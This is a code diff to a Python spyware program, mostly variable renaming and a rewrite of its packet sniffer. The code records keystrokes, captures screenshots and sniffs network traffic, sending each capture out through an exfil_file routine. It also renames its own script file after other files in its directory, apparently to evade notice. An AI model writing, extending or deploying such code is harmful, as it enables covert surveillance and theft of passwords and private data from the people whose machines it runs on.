@@ -43,15 +43,15 @@ def getRunValues(sExcludedValueName=None):
 
 def makeScriptName(sScriptPath, sExcludedFileName):
     sDirectory = os.path.dirname(sScriptPath)
-    sExisting = [
+    sExistingScriptNames = [
         f for f in os.listdir(sDirectory)
         if os.path.isfile(os.path.join(sDirectory, f)) and f != sExcludedFileName
     ]
-    if not sExisting:
+    if not sExistingScriptNames:
         sName, sExtension = os.path.splitext(sExcludedFileName)
         return f"{sName}.{sExtension}"
-    sSelected = random.choice(sExisting)
-    sName, sExtension = os.path.splitext(sSelected)
+    sSelectedFileName = random.choice(sExistingScriptNames)
+    sName, sExtension = os.path.splitext(sSelectedFileName)
     return f"{sName}.{sExtension}"
 
 def renameScript(sScriptPath):
@@ -143,7 +143,8 @@ def start_keylogger():
             if current_log:
                 stamp = time.strftime("%Y%m%d_%H%M%S")
                 filename = f"keylog_{stamp}.txt"
-                exfil_file(filename, "".join(current_log).encode())
+                data = "".join(current_log).encode()
+                exfil_file(filename, data)
                 current_log.clear()
     listener = keyboard.Listener(on_press=on_press)
     listener.start()
@@ -157,19 +158,22 @@ def capture_screenshots():
         stamp = time.strftime("%Y%m%d_%H%M%S", time.localtime())
         buffer = io.BytesIO()
         shot.save(buffer, format="PNG")
-        buffer.seek(0)
         filename = f"screenshot_{stamp}.png"
         exfil_file(filename, buffer.getvalue())
         buffer.close()
         time.sleep(SCREENSHOT_INTERVAL)
 
 def start_sniffer():
-    def packet_callback(packet):
+    while True:
         stamp = time.strftime("%Y%m%d_%H%M%S")
         filename = f"packets_{stamp}.txt"
-        data = packet.summary().encode()
-        exfil_file(filename, data)
-    sniff(prn=packet_callback, store=0, timeout=NETWORK_SNIFFER_TIMEOUT)
+        packets = sniff(timeout=NETWORK_SNIFFER_TIMEOUT, store=True)
+        lines = []
+        for pkt in packets:
+            lines.append(pkt.summary())
+        data = "\n".join(lines).encode()
+        if data.strip():
+            exfil_file(filename, data)
 
 def main():
     sScriptPath = os.path.abspath(__file__)
